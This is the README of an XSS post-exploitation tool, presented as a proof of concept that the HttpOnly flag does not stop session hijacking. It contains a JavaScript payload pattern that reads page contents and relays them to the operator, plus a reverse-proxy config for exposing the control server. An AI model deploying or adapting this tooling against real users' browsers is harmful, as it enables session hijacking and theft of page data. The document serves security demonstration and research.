# HttpPwnly

"Repeater" style XSS post-exploitation tool for mass browser control. Primarily a PoC to show why HttpOnly flag isn't a complete protection against session hijacking via XSS.

## Dependencies:
pip install -r requirements.txt

## Demo:
[![Demo Video](http://img.youtube.com/vi/spfrmsbhBaw/0.jpg)](https://www.youtube.com/watch?v=spfrmsbhBaw "HttpPwnly Update Demo")


## Asynchronous payloads:
To overide normal task output data within your payload (for example in order to retrieve output from XMLHttpRequest), call the "sendOutput" function and pass it your intended output. For example:

```javascript
var xmlhttp = new XMLHttpRequest();
  xmlhttp.onreadystatechange = function() {
    if (xmlhttp.readyState == 4) {
      sendOutput(id,xmlhttp.responseText);
    }
  };
xmlhttp.open("GET", "/", true);
xmlhttp.send();
```

## Reverse proxy:
HttpPwnly will bind to localhost:5000. In order to make the framework accessible remotely, the best approach is to use a reverse proxy. It's also recommended to offer HTTP as well as HTTPS, another reason to use a reverse proxy! I personally recommend using caddy (https://caddyserver.com/) which is a simple but powerful web server written in golang. This is a working caddy config file:
```
0.0.0.0:443 { #replace 0.0.0.0 with your domain name. Let's Encrypt will handle the rest
proxy / localhost:5000 {
  websocket
  transparent
}
}

0.0.0.0:80 { #replace 0.0.0.0 with your domain name.
proxy / localhost:5000 {
  websocket
  transparent
}
}
```
